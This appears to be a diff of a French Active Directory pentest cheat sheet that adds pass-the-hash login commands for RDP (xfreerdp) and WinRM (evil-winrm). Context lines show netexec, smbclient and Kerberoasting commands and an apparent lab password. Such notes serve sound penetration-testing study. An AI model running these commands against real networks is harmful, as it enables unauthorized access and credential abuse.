@@ -18,7 +18,7 @@ nxc ldap $IP -u $USER -p $PASSWORD -d $DOMAIN --user <USER> ## Info user LDAP
 nxc winrm $IP -u $USER -p $PASSWORD ## Connexion WinRM
 ```
 
-## SMB
+## smbclient
 
 ```bash
 smbclient //$IP/NAME-SHARE$ -U "$DOMAIN/$USER%$PASSWORD" ## Connexion share SMB
@@ -56,3 +56,14 @@ mdp: @PentestAD1234!!
 GetUserSPNs.py imperium.local/$USER:$PASSWORD -dc-ip $IP -request-user thufir.hawat ## Récupérer ticket kerberos 
 ```
 
+## RDP
+
+```bash
+xfreerdp /u:$USER /pth:$NT_HASH /d:$DOMAIN /v:$IP
+```
+
+## WinRM
+
+```bash
+evil-winrm -i $IP -u $USER -H $NT_HASH
+```
